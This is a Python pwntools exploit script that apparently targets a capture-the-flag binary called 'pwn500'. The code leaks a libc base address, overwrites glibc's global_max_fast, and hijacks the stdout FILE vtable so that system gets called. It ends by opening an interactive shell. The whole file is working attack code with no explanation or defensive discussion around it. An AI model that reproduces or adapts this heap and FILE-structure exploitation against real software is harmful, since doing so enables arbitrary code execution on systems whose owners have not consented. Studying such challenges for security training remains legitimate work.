from pwn import *
debug=1
context.log_level = 'debug'
if debug==1:
    io = process('./pwn500')
elif debug==0:
    io = remote("",1234)
elf = ELF('./pwn500')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
s       = lambda data               :io.send(data) 
sa      = lambda data1,data         :io.sendafter(data1, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda data1,data         :io.sendlineafter(data1, data)
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda data1, drop=True  :io.recvuntil(data1, drop)

def Meyer(*aa):
    ru('Pls input your choice:')
    sl('1')
    for a in aa:
        ru('Pls Input your choice:')
        sl(str(a))
def Ponderosa(*aa):
    ru('Pls input your choice:')
    sl('2')
    for a in aa:
        ru('Pls Input your choice:')
        sl(str(a))
        if(a==4):
            ru('Get Input:')
            global c
            sl(c)
def Leave(*aa):
    ru('Pls input your choice:')
    sl('3')
    for a in aa:
        r()
        sl(a)
def Submit():
    ru('Pls input your choice:')
    sl('4')
    ru('Pls input your phone number first:')
    s('1'*15)
    ru('Ok,Pls input your home address')
    sl('1'*40)    
    ru(b'OK,your input is:')
    return u64((ru('\x0a')[40:]).ljust(8,b'\x00'))-224912

libc.address=Submit()
print(hex(libc.address))

onegadgets=[0x45216,0x4526a,0xf02a4,0xf1147]
onegadgets=[283158 ,283242 ,839923 ,840136 ,983716 ,983728 ,987463 ,1009392]
stdout=0x1460+25*16+28*16#0x17c0-8
stderr=0x1460+25*16
#c=b'|sh\x00'.ljust(8,b'\x00')
c=p64(libc.symbols['system'])*30#
#c+=p64(libc.address+onegadgets[1])*30# #vtable


Leave(b'1',str(stdout),'2',c,'4')
c=b'1'*24
c+=p64(libc.address+0x3c67f8-0x10)

#change global_max_fast
Ponderosa(2,4,3,5)

#change stdout->vtable
Leave(b'3')

io.interactive()